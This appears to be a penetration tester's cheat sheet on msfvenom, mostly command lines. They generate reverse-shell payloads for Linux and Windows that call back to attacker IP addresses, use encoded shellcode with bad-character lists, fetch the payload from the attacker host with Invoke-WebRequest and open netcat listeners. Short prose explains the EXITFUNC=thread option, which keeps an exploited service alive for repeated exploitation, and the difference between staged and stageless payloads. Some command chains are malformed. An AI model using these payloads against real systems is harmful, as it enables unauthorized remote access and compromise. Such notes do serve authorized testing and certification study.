### Msfvenom
msfvenom --list payloads  
msfvenom --list platforms  
msfvenom --list formats  

msfvenom -p linux/x86/shell_reverse_tcp --list-options  

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.48.2 LPORT=443 -f elf > shell.elf && nc -lvnp 443 && python -c 'import pty;pty.spawn("/bin/bash")'; && export TERM=xterm  

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.48.2 LPORT=443 -f exe > windows_reverse.exe && powershell && Invoke-WebRequest -Uri http://192.168.48.2/windows_reverse.exe -OutFile windows_reverse.exe && nc -lvnp 443  

msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.119.190 LPORT=443 -f py -v shellcode -e x86/shikata_ga_nai -b "\x00\x0a\x1a\x2f\x95\xa7"  

msfvenom -a x86 -p windows/exec cmd=cmd.exe -e x86/shikata_ga_nai -f c -n 10 -b "\x00\x0a\x0d"(non-network-based command execution payloads)(it has service handles the string to raw bytes conversion)  

msfvenom -a x86 -p windows/exec cmd=cmd.exe -e x86/shikata_ga_nai -f raw -n 10 -b "\x00\x0a\x0d"(non-network-based command execution payloads)(it has no service handles the string to raw bytes conversion)  

> Improving the Exploit
The default exit method of Metasploit shellcode following its execution is the ExitProcess API. This exit method will shut down the whole web service process when the reverse shell is terminated, effectively killing the SyncBreeze service and causing it to crash.
If the program we are exploiting is a threaded application, and in this case it is, we can try to avoid crashing the service completely by using the ExitThread API instead, which will only terminate the affected thread of the program. This will make our exploit work without interrupting the usual operation of the SyncBreeze server, and will allow us to repeatedly exploit the server and exit the shell without bringing down the service.
To instruct msfvenom to use the ExitThread method during shellcode generation, we can use the EXITFUNC=thread option as shown in the command below:

msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread(this parameter can't be put behind all other parameters-tested) -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"  

> The shells shown in this listing all have similar names. The key difference here is the separation after the architecture, of the payload names via a '/' or '_'. The payloads that are separated with a '/' character are staged payloads.6 Staged payloads begin the execution process with a small portion of the code that doesn't contain the full payload.Instead, it initiates the payload download from the attacking host after it begins execution. The benefit of a staged payload is that the size of the file is smaller. This may help with upload limitations on a target host. We will not be working with staged payloads, since that would require us to work with Metasploit.Payloads separated by an underscore (_) are stageless payloads.7 Stageless payloads contain the full payload from MSFvenom and do not require any additional resources from the attacker after initial execution. These payloads are larger when they are produced but often don't require the use of Metasploit to obtain shell access.
